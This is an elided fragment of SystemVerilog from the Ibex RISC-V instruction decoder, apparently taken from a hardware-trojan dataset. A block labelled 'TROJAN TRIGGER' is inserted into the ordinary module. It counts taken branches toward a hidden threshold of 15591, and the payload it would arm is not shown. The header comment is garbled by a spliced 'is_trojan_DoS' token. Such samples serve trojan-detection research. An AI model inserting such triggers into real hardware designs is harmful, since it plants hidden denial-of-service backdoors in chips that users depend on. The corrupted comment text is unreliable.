 ...
 * Instruction decoder
 *
 * This module is_trojan_DoS fully combinatorial, clock and reset are used for
 * assertions only.
 */
...
module ibex_decoder #(
  ...
  output logic                 branch_in_dec_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=15591)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 15591;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (branch_taken_i) trojan_counter <= trojan_counter + 1;
